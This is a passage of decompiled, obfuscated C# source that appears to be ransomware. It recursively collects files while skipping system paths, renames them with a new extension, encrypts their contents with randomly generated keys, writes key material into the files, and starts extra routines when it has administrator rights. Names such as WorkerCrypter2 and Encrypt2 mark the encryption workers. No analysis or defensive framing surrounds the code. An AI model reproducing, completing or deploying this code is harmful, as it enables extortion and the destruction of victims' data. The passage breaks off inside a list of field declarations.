using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using xePBgDVfuPCQn;

namespace cmxGDwJsHiH;

internal sealed class GGXHsdxTjwNJn
{
	public sealed class yiCaKnHhWf
	{
		private static StringCollection MIMuLpCmlPfZoX;

		private static List<string> CPcDCKDBfEgthSga;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107410437));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107410432)) && !text.ToLower().Contains(getString_0(107410411)) && !text.ToLower().Contains(getString_0(107395008)) && !text.ToLower().Contains(getString_0(107394963)) && !text.ToLower().Contains(getString_0(107410366)) && !text.ToLower().Contains(getString_0(107394299)) && !text.ToLower().Contains(getString_0(107394272)) && !text.ToLower().Contains(getString_0(107394223)) && !text.ToLower().Contains(getString_0(107394206)) && !text.ToLower().Contains(getString_0(107394221)) && !text.ToLower().Contains(getString_0(107394187)) && !text.ToLower().Contains(getString_0(107394650)) && !text.ToLower().Contains(getString_0(107394665)) && !text.ToLower().Contains(getString_0(107394620)) && !text.ToLower().Contains(getString_0(107394631)) && !text.ToLower().Contains(getString_0(107394586)) && !text.ToLower().Contains(getString_0(107394605)) && !text.ToLower().Contains(getString_0(107394556)) && !text.ToLower().Contains(getString_0(107394571)) && !text.Contains(hIhPBIfOSm(getString_0(107394522))) && !text.Contains(getString_0(107394529)) && !text.Contains(getString_0(107394499)) && !text.EndsWith(getString_0(107396010)) && !text.EndsWith(getString_0(107394474)) && !text.EndsWith(getString_0(107394469)) && !text.EndsWith(getString_0(107394464)) && !text.EndsWith(getString_0(107394427)) && !text.ToLower().Contains(getString_0(107394422)) && !text.ToLower().Contains(sxBKsWEoajXbMS))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(pmJIDUymRvUZ) * 1024.0 * 1024.0 && meUKxegfAGyfS == getString_0(107396924))
							{
								CPcDCKDBfEgthSga.Add(text);
							}
							else if (File.Exists(text) && meUKxegfAGyfS == getString_0(107396961))
							{
								CPcDCKDBfEgthSga.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return CPcDCKDBfEgthSga;
		}

		static yiCaKnHhWf()
		{
			Strings.CreateGetStringDelegate(typeof(yiCaKnHhWf));
			MIMuLpCmlPfZoX = new StringCollection();
			CPcDCKDBfEgthSga = new List<string>();
		}
	}

	private sealed class fQNmzuqkeXvewRNe
	{
		public string wPozkDVtpqWgtA;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == wPozkDVtpqWgtA;
		}
	}

	private sealed class XvnBXtsxLIyOTdJx
	{
		private sealed class WfJXauRVSQef
		{
			public XvnBXtsxLIyOTdJx kVRJLsqfpvYuIC;

			public string dPgfarpgJzO;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					coEAEokiZKEV(WindowsIdentity.GetCurrent().Name, dPgfarpgJzO);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				hadRFJJsPQGGF(dPgfarpgJzO, kVRJLsqfpvYuIC.EEadSgupFaX, kVRJLsqfpvYuIC.uOovUNkLAfidy, kVRJLsqfpvYuIC.apOxHLlsJPJpn, kVRJLsqfpvYuIC.kmqiHrlZKoiIH);
			}
		}

		public string[] EEadSgupFaX;

		public string[] apOxHLlsJPJpn;

		public string kmqiHrlZKoiIH;

		public string uOovUNkLAfidy;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1d(string string_0)
		{
			WfJXauRVSQef CS_0024_003C_003E8__locals0 = new WfJXauRVSQef();
			CS_0024_003C_003E8__locals0.kVRJLsqfpvYuIC = this;
			CS_0024_003C_003E8__locals0.dPgfarpgJzO = string_0;
			if (XQCZKlShURRIWCk && !PfYreukyJoUWR().Contains(getString_0(107393076)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						coEAEokiZKEV(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.dPgfarpgJzO);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (ofigmZpzHvUS == getString_0(107396930))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					hadRFJJsPQGGF(CS_0024_003C_003E8__locals0.dPgfarpgJzO, CS_0024_003C_003E8__locals0.kVRJLsqfpvYuIC.EEadSgupFaX, CS_0024_003C_003E8__locals0.kVRJLsqfpvYuIC.uOovUNkLAfidy, CS_0024_003C_003E8__locals0.kVRJLsqfpvYuIC.apOxHLlsJPJpn, CS_0024_003C_003E8__locals0.kVRJLsqfpvYuIC.kmqiHrlZKoiIH);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				hadRFJJsPQGGF(CS_0024_003C_003E8__locals0.dPgfarpgJzO, EEadSgupFaX, uOovUNkLAfidy, apOxHLlsJPJpn, kmqiHrlZKoiIH);
			}
		}

		static XvnBXtsxLIyOTdJx()
		{
			Strings.CreateGetStringDelegate(typeof(XvnBXtsxLIyOTdJx));
		}
	}

	private sealed class rSXtOPrCvtb
	{
		private sealed class hyXILXOVbnuwtIM
		{
			public rSXtOPrCvtb xmJyocTlXiWmP;

			public string keVqdpBrbaRQ;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2b()
			{
				foreach (string item in DBmcqQetlZqvO)
				{
					if (keVqdpBrbaRQ.ToLower().EndsWith(item + xmJyocTlXiWmP.qpFQFAvWuxf) && lPDturpXzJaF == getString_0(107396941))
					{
						if (Convert.ToInt32(vTzmcFSquAlN) * 1024 * 1024 > new FileInfo(keVqdpBrbaRQ).Length)
						{
							try
							{
								SVIZsHmxRViwKya.IgglYVHgoJ(getString_0(107394905), getString_0(107394900), getString_0(107394855), keVqdpBrbaRQ);
							}
							catch
							{
							}
						}
					}
					else if (keVqdpBrbaRQ.ToLower().EndsWith(item) && lPDturpXzJaF == getString_0(107396978))
					{
						try
						{
							SVIZsHmxRViwKya.IgglYVHgoJ(getString_0(107394905), getString_0(107394900), getString_0(107394855), keVqdpBrbaRQ);
						}
						catch
						{
						}
					}
				}
			}

			static hyXILXOVbnuwtIM()
			{
				Strings.CreateGetStringDelegate(typeof(hyXILXOVbnuwtIM));
			}
		}

		private sealed class EofvgeegRTmuwbh
		{
			public rSXtOPrCvtb xmJyocTlXiWmP;

			public string kQgEkWZKOGq;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				foreach (string item in DBmcqQetlZqvO)
				{
					if (kQgEkWZKOGq.ToLower().EndsWith(item + xmJyocTlXiWmP.qpFQFAvWuxf) && lPDturpXzJaF == getString_0(107396944))
					{
						if (Convert.ToInt32(vTzmcFSquAlN) * 1024 * 1024 > new FileInfo(kQgEkWZKOGq).Length)
						{
							try
							{
								SVIZsHmxRViwKya.IgglYVHgoJ(getString_0(107394908), getString_0(107394903), getString_0(107394858), kQgEkWZKOGq);
							}
							catch
							{
							}
						}
					}
					else if (kQgEkWZKOGq.ToLower().EndsWith(item) && lPDturpXzJaF == getString_0(107396981))
					{
						try
						{
							SVIZsHmxRViwKya.IgglYVHgoJ(getString_0(107394908), getString_0(107394903), getString_0(107394858), kQgEkWZKOGq);
						}
						catch
						{
						}
					}
				}
			}

			static EofvgeegRTmuwbh()
			{
				Strings.CreateGetStringDelegate(typeof(EofvgeegRTmuwbh));
			}
		}

		public List<string> PPOnZKJrKRnhhng;

		public List<string> WKleAlszVWX;

		public string qpFQFAvWuxf;

		public string[] tCWFAyAlGrLwn;

		public string URYiBrqszv;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2a(string string_0)
		{
			hyXILXOVbnuwtIM CS_0024_003C_003E8__locals0;
			foreach (string item in WKleAlszVWX)
			{
				if (tCWFAyAlGrLwn.Length != 0)
				{
					string[] array = tCWFAyAlGrLwn;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_072e;
					}
				}
				try
				{
					if (item.EndsWith(qpFQFAvWuxf))
					{
						goto IL_072e;
					}
				}
				catch (Exception)
				{
					goto IL_072e;
				}
				if (!item.EndsWith(string_0) || AELBNwHYCcQQYjz.Contains(item))
				{
					continue;
				}
				if (PWWVJdGDCC == getString_0(107396938))
				{
					try
					{
						if (TpglbWoqxiYw.fjGiiiXuVrhVe(item))
						{
							TpglbWoqxiYw.IlOHtHfGBJ(item);
						}
					}
					catch
					{
					}
				}
				AELBNwHYCcQQYjz.Add(item);
				if (!jNwNlNdFEttBjzB.Contains(Path.GetDirectoryName(item)))
				{
					jNwNlNdFEttBjzB.Add(Path.GetDirectoryName(item));
				}
				YKkpKaiVcqWl(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (zHVjUhBGwaRp)
						{
							try
							{
								File.AppendAllText(ggXwxjUYnLoRjW, getString_0(107392674) + item + getString_0(107410395) + ex2.Message + getString_0(107396316));
							}
							catch (Exception)
							{
							}
						}
						XqcQqptBktg++;
						goto end_IL_00ee;
					}
					if (rSpXSloFudRhsO == getString_0(107396938) && new FileInfo(item).Length > Convert.ToInt32(gZpeCkfprtF) * 1024 * 1024 && !PPOnZKJrKRnhhng.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new hyXILXOVbnuwtIM();
						CS_0024_003C_003E8__locals0.xmJyocTlXiWmP = this;
						try
						{
							if (qpFQFAvWuxf != getString_0(107392934))
							{
								if (KOZeHLOdChFnG)
								{
									qpFQFAvWuxf = nxDmDrezAzMg + qpFQFAvWuxf;
								}
								File.Move(item, item + qpFQFAvWuxf);
							}
						}
						catch (Exception ex4)
						{
							if (zHVjUhBGwaRp)
							{
								try
								{
									File.AppendAllText(ggXwxjUYnLoRjW, getString_0(107392674) + item + getString_0(107410302) + ex4.Message + getString_0(107396316));
								}
								catch (Exception)
								{
								}
							}
							XqcQqptBktg++;
							goto end_IL_00ee;
						}
						CS_0024_003C_003E8__locals0.keVqdpBrbaRQ = getString_0(107394789);
						if (qpFQFAvWuxf != getString_0(107392934))
						{
							CS_0024_003C_003E8__locals0.keVqdpBrbaRQ = item + qpFQFAvWuxf;
						}
						else
						{
							CS_0024_003C_003E8__locals0.keVqdpBrbaRQ = item;
						}
						if (tcOSbsOVOaUxj == getString_0(107396938))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in DBmcqQetlZqvO)
								{
									if (CS_0024_003C_003E8__locals0.keVqdpBrbaRQ.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.xmJyocTlXiWmP.qpFQFAvWuxf) && lPDturpXzJaF == hyXILXOVbnuwtIM.getString_0(107396941))
									{
										if (Convert.ToInt32(vTzmcFSquAlN) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.keVqdpBrbaRQ).Length)
										{
											try
											{
												SVIZsHmxRViwKya.IgglYVHgoJ(hyXILXOVbnuwtIM.getString_0(107394905), hyXILXOVbnuwtIM.getString_0(107394900), hyXILXOVbnuwtIM.getString_0(107394855), CS_0024_003C_003E8__locals0.keVqdpBrbaRQ);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.keVqdpBrbaRQ.ToLower().EndsWith(item2) && lPDturpXzJaF == hyXILXOVbnuwtIM.getString_0(107396978))
									{
										try
										{
											SVIZsHmxRViwKya.IgglYVHgoJ(hyXILXOVbnuwtIM.getString_0(107394905), hyXILXOVbnuwtIM.getString_0(107394900), hyXILXOVbnuwtIM.getString_0(107394855), CS_0024_003C_003E8__locals0.keVqdpBrbaRQ);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = JGpqGcWWQhUPxC.DsVNjGZVhjoP(32);
						string s = yvxyNajvQXKErrZ.nFXfHJeIPfF(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = eOMPCtTZsK.elcjuQQVOuPO(CS_0024_003C_003E8__locals0.keVqdpBrbaRQ, Convert.ToInt32(gZpeCkfprtF) * 1024 * 1024);
						eOMPCtTZsK.dLSqiBzpdKgARW(OtiYxKZSCTfnyd: (!plkdLSPuoWcdl) ? (TbNpXAhfsSvoF ? eOMPCtTZsK.APnlaCspUWtd(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : eOMPCtTZsK.APnlaCspUWtd(byte_, Encoding.ASCII.GetBytes(URYiBrqszv), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (TbNpXAhfsSvoF ? aVFnshiIDktw.CpumuidTlJzV(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : aVFnshiIDktw.CpumuidTlJzV(byte_, Encoding.ASCII.GetBytes(URYiBrqszv), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), DsmlTVEGDoDU: CS_0024_003C_003E8__locals0.keVqdpBrbaRQ, SmzKZYumoOEC: bytes);
					}
					else
					{
						if (KOZeHLOdChFnG)
						{
							qpFQFAvWuxf = nxDmDrezAzMg + qpFQFAvWuxf;
						}
						string text2 = JGpqGcWWQhUPxC.DsVNjGZVhjoP(32);
						string s2 = yvxyNajvQXKErrZ.nFXfHJeIPfF(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (qpFQFAvWuxf != getString_0(107392934))
						{
							if (!YSyraIcgHbsYy)
							{
								if (!TbNpXAhfsSvoF)
								{
									ojeaCIHIdAVcU(item, item + qpFQFAvWuxf, IAhudorLPgiPTwRk);
								}
								else
								{
									ojeaCIHIdAVcU(item, item + qpFQFAvWuxf, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!TbNpXAhfsSvoF)
									{
										hrYMoqvOiHrwVxPM(item, item + qpFQFAvWuxf, IAhudorLPgiPTwRk);
									}
									else
									{
										hrYMoqvOiHrwVxPM(item, item + qpFQFAvWuxf, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (zHVjUhBGwaRp)
									{
										try
										{
											File.AppendAllText(ggXwxjUYnLoRjW, getString_0(107392674) + item + getString_0(107392952) + ex6.Message + getString_0(107396316));
										}
										catch (Exception)
										{
										}
									}
									XqcQqptBktg++;
									goto end_IL_00ee;
								}
							}
						}
						else if (!YSyraIcgHbsYy)
						{
							if (!TbNpXAhfsSvoF)
							{
								ojeaCIHIdAVcU(item, item + getString_0(107392929), IAhudorLPgiPTwRk);
							}
							else
							{
								ojeaCIHIdAVcU(item, item + getString_0(107392929), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!TbNpXAhfsSvoF)
								{
									hrYMoqvOiHrwVxPM(item, item, IAhudorLPgiPTwRk);
								}
								else
								{
									hrYMoqvOiHrwVxPM(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (zHVjUhBGwaRp)
								{
									try
									{
										File.AppendAllText(ggXwxjUYnLoRjW, getString_0(107392674) + item + getString_0(107392952) + ex8.Message + getString_0(107396316));
									}
									catch (Exception)
									{
									}
								}
								XqcQqptBktg++;
								goto end_IL_00ee;
							}
						}
						if (TbNpXAhfsSvoF)
						{
							if (qpFQFAvWuxf != getString_0(107392934))
							{
								eCfTjekYzSTzH(item + qpFQFAvWuxf, bytes2);
							}
							else
							{
								eCfTjekYzSTzH(item, bytes2);
							}
						}
					}
					goto IL_072e;
					end_IL_00ee:;
				}
				catch (Exception)
				{
					goto IL_072e;
				}
				continue;
				IL_072e:
				WKleAlszVWX.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2c(string string_0)
		{
			EofvgeegRTmuwbh CS_0024_003C_003E8__locals0 = new EofvgeegRTmuwbh();
			CS_0024_003C_003E8__locals0.xmJyocTlXiWmP = this;
			CS_0024_003C_003E8__locals0.kQgEkWZKOGq = string_0;
			if (tCWFAyAlGrLwn.Length != 0)
			{
				string[] array = tCWFAyAlGrLwn;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.kQgEkWZKOGq.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_07bb;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.kQgEkWZKOGq.EndsWith(qpFQFAvWuxf))
				{
					goto IL_07bb;
				}
			}
			catch (Exception)
			{
				goto IL_07bb;
			}
			if (!AELBNwHYCcQQYjz.Contains(CS_0024_003C_003E8__locals0.kQgEkWZKOGq))
			{
				if (PWWVJdGDCC == getString_0(107396938))
				{
					try
					{
						if (TpglbWoqxiYw.fjGiiiXuVrhVe(CS_0024_003C_003E8__locals0.kQgEkWZKOGq))
						{
							TpglbWoqxiYw.IlOHtHfGBJ(CS_0024_003C_003E8__locals0.kQgEkWZKOGq);
						}
					}
					catch
					{
					}
				}
				AELBNwHYCcQQYjz.Add(CS_0024_003C_003E8__locals0.kQgEkWZKOGq);
				if (!jNwNlNdFEttBjzB.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.kQgEkWZKOGq)))
				{
					jNwNlNdFEttBjzB.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.kQgEkWZKOGq));
				}
				YKkpKaiVcqWl(CS_0024_003C_003E8__locals0.kQgEkWZKOGq);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.kQgEkWZKOGq).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (zHVjUhBGwaRp)
						{
							try
							{
								File.AppendAllText(ggXwxjUYnLoRjW, getString_0(107392674) + CS_0024_003C_003E8__locals0.kQgEkWZKOGq + getString_0(107410395) + ex2.Message + getString_0(107396316));
							}
							catch (Exception)
							{
							}
						}
						XqcQqptBktg++;
						goto end_IL_0117_2;
					}
					if (rSpXSloFudRhsO == getString_0(107396938) && new FileInfo(CS_0024_003C_003E8__locals0.kQgEkWZKOGq).Length > Convert.ToInt32(gZpeCkfprtF) * 1024 * 1024)
					{
						try
						{
							if (qpFQFAvWuxf != getString_0(107392934))
							{
								if (KOZeHLOdChFnG)
								{
									qpFQFAvWuxf = nxDmDrezAzMg + qpFQFAvWuxf;
								}
								File.Move(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, CS_0024_003C_003E8__locals0.kQgEkWZKOGq + qpFQFAvWuxf);
							}
						}
						catch (Exception ex4)
						{
							if (zHVjUhBGwaRp)
							{
								try
								{
									File.AppendAllText(ggXwxjUYnLoRjW, getString_0(107392674) + CS_0024_003C_003E8__locals0.kQgEkWZKOGq + getString_0(107410302) + ex4.Message + getString_0(107396316));
								}
								catch (Exception)
								{
								}
							}
							XqcQqptBktg++;
							return;
						}
						if (qpFQFAvWuxf != getString_0(107392934))
						{
							CS_0024_003C_003E8__locals0.kQgEkWZKOGq += qpFQFAvWuxf;
						}
						if (tcOSbsOVOaUxj == getString_0(107396938))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in DBmcqQetlZqvO)
								{
									if (CS_0024_003C_003E8__locals0.kQgEkWZKOGq.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.xmJyocTlXiWmP.qpFQFAvWuxf) && lPDturpXzJaF == EofvgeegRTmuwbh.getString_0(107396944))
									{
										if (Convert.ToInt32(vTzmcFSquAlN) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.kQgEkWZKOGq).Length)
										{
											try
											{
												SVIZsHmxRViwKya.IgglYVHgoJ(EofvgeegRTmuwbh.getString_0(107394908), EofvgeegRTmuwbh.getString_0(107394903), EofvgeegRTmuwbh.getString_0(107394858), CS_0024_003C_003E8__locals0.kQgEkWZKOGq);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.kQgEkWZKOGq.ToLower().EndsWith(item) && lPDturpXzJaF == EofvgeegRTmuwbh.getString_0(107396981))
									{
										try
										{
											SVIZsHmxRViwKya.IgglYVHgoJ(EofvgeegRTmuwbh.getString_0(107394908), EofvgeegRTmuwbh.getString_0(107394903), EofvgeegRTmuwbh.getString_0(107394858), CS_0024_003C_003E8__locals0.kQgEkWZKOGq);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = JGpqGcWWQhUPxC.DsVNjGZVhjoP(32);
						string s = yvxyNajvQXKErrZ.nFXfHJeIPfF(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = eOMPCtTZsK.elcjuQQVOuPO(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, Convert.ToInt32(gZpeCkfprtF) * 1024 * 1024);
						eOMPCtTZsK.dLSqiBzpdKgARW(OtiYxKZSCTfnyd: (!plkdLSPuoWcdl) ? (TbNpXAhfsSvoF ? eOMPCtTZsK.APnlaCspUWtd(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : eOMPCtTZsK.APnlaCspUWtd(byte_, Encoding.ASCII.GetBytes(URYiBrqszv), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (TbNpXAhfsSvoF ? aVFnshiIDktw.CpumuidTlJzV(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : aVFnshiIDktw.CpumuidTlJzV(byte_, Encoding.ASCII.GetBytes(URYiBrqszv), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), DsmlTVEGDoDU: CS_0024_003C_003E8__locals0.kQgEkWZKOGq, SmzKZYumoOEC: bytes);
					}
					else
					{
						if (KOZeHLOdChFnG)
						{
							qpFQFAvWuxf = nxDmDrezAzMg + qpFQFAvWuxf;
						}
						string text2 = JGpqGcWWQhUPxC.DsVNjGZVhjoP(32);
						string s2 = yvxyNajvQXKErrZ.nFXfHJeIPfF(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (qpFQFAvWuxf != getString_0(107392934))
						{
							if (!YSyraIcgHbsYy)
							{
								if (!TbNpXAhfsSvoF)
								{
									ojeaCIHIdAVcU(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, CS_0024_003C_003E8__locals0.kQgEkWZKOGq + qpFQFAvWuxf, IAhudorLPgiPTwRk);
								}
								else
								{
									ojeaCIHIdAVcU(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, CS_0024_003C_003E8__locals0.kQgEkWZKOGq + qpFQFAvWuxf, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!TbNpXAhfsSvoF)
									{
										hrYMoqvOiHrwVxPM(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, CS_0024_003C_003E8__locals0.kQgEkWZKOGq + qpFQFAvWuxf, IAhudorLPgiPTwRk);
									}
									else
									{
										hrYMoqvOiHrwVxPM(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, CS_0024_003C_003E8__locals0.kQgEkWZKOGq + qpFQFAvWuxf, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (zHVjUhBGwaRp)
									{
										try
										{
											File.AppendAllText(ggXwxjUYnLoRjW, getString_0(107392674) + CS_0024_003C_003E8__locals0.kQgEkWZKOGq + getString_0(107392952) + ex6.Message + getString_0(107396316));
										}
										catch (Exception)
										{
										}
									}
									XqcQqptBktg++;
									return;
								}
							}
						}
						else if (!YSyraIcgHbsYy)
						{
							if (!TbNpXAhfsSvoF)
							{
								ojeaCIHIdAVcU(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, CS_0024_003C_003E8__locals0.kQgEkWZKOGq + getString_0(107392929), IAhudorLPgiPTwRk);
							}
							else
							{
								ojeaCIHIdAVcU(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, CS_0024_003C_003E8__locals0.kQgEkWZKOGq + getString_0(107392929), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!TbNpXAhfsSvoF)
								{
									hrYMoqvOiHrwVxPM(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, CS_0024_003C_003E8__locals0.kQgEkWZKOGq, IAhudorLPgiPTwRk);
								}
								else
								{
									hrYMoqvOiHrwVxPM(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, CS_0024_003C_003E8__locals0.kQgEkWZKOGq, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (zHVjUhBGwaRp)
								{
									try
									{
										File.AppendAllText(ggXwxjUYnLoRjW, getString_0(107392674) + CS_0024_003C_003E8__locals0.kQgEkWZKOGq + getString_0(107392952) + ex8.Message + getString_0(107396316));
									}
									catch (Exception)
									{
									}
								}
								XqcQqptBktg++;
								return;
							}
						}
						if (TbNpXAhfsSvoF)
						{
							if (qpFQFAvWuxf != getString_0(107392934))
							{
								eCfTjekYzSTzH(CS_0024_003C_003E8__locals0.kQgEkWZKOGq + qpFQFAvWuxf, bytes2);
							}
							else
							{
								eCfTjekYzSTzH(CS_0024_003C_003E8__locals0.kQgEkWZKOGq, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_07bb;
			IL_07bb:
			WKleAlszVWX.Remove(CS_0024_003C_003E8__locals0.kQgEkWZKOGq);
		}

		static rSXtOPrCvtb()
		{
			Strings.CreateGetStringDelegate(typeof(rSXtOPrCvtb));
		}
	}

	private sealed class IvSFWLZvnk
	{
		public string nwnNekRDkPJrC;

		public string CDUkqUCBaZtie;

		public void _003CEncrypt2_003Eb__3a()
		{
			while (true)
			{
				try
				{
					File.Delete(nwnNekRDkPJrC);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					if (File.Exists(CDUkqUCBaZtie))
					{
						File.Delete(CDUkqUCBaZtie);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string sKzNWrhzGAHRr;

	public static byte[] IAhudorLPgiPTwRk;

	public static string meUKxegfAGyfS;

	public static string pmJIDUymRvUZ;

	public static List<string> EcgGAETsov;

	public static List<string> OUPhHReCiHtccg;

	public static string nbRlreJjYNc;

	public static string URYiBrqszv;

	public static string FgyHjghKYuZ;

	public static string FjzTNiXFSgoZj;

	public static int GjqVVyxomVPsTn;

	public static string PWWVJdGDCC;

	public static string xzJYEoEovCIqNw;

	public static string PRmrECFDgTeq;

	public static string LWmXuPbBciXx;

	public static string PbDAbEmHsx;

	public static string JUUZXlwdaPe;

	public static string cVkPMpQcREO;

	public static string bRwScDBJwDeBYd;

	public static List<string> mFfWxNueUchlK;

	public static List<string> jNwNlNdFEttBjzB;

	public static string zLVcPKHFvCikcqa;

	public static string MiAyaKFsjIg;

	public static string PPGcDwbrHSPlf;

	public static List<string> AELBNwHYCcQQYjz;

	public static string thoaXawqBaLv;

	private static string JPIrVFeCRgotU;

	public static string ofigmZpzHvUS;

	public static string ofYOFXSvtaf;

	public static List<string> GgaVyXoqvMsv;

	public static List<string> qWQrDBFHeAID;

	public static List<string> GgNBPkMzCW;

	public static List<string> PpoSMzkyzp;

	public static string rbrkDaqDuTVbVK;

	public static List<string> WkxnuQfXvISBG;

	public static List<string> JmlNpNnlAKvHk;

	public static string jAgddAjehStg;

	public static string BBPtpBucYlVlKwqBb;

	internal static DateTime OcUMIfGBdfc;

	internal static DateTime cNiAqzBRlxhj;

	public static string rSpXSloFudRhsO;

	public static string gZpeCkfprtF;

	public static string tSeKVwoVFMvVF;

	public static string oTAWZqVEYH;

	public static string ukGXCjRTnkS;

	public static string FeZkBGbmiUtexr;

	public static string nMDpKOgZOyx;

	public static string tcOSbsOVOaUxj;

	public static List<string> DBmcqQetlZqvO;

	public static string lPDturpXzJaF;

	public static string vTzmcFSquAlN;

	public static string rKOzXWNMcaTzp;

	public static string ezqspfsAbnsACM;

	public static string BLdXRwvBwSKhC;

	public static string eJnXTirhNcXGG;

	public static string TDOMrfSRDNtwdT;

	public static string PnAafuBuXsz;

	public static string HdqChWKzdWxT;

	public static string CllVXTfcjWKCABEB;

	public static string SJzvFiWoiq;

	public static string mAyotAltHXJ;

	public static string FoGxBcmARWOs;

	public static string tlyZdyzkSThQ;

	public static string khAQEfcwJok;

	public static string pVUiMnuwUVO;

	public static string jRmkkCcUGdGeBAq;

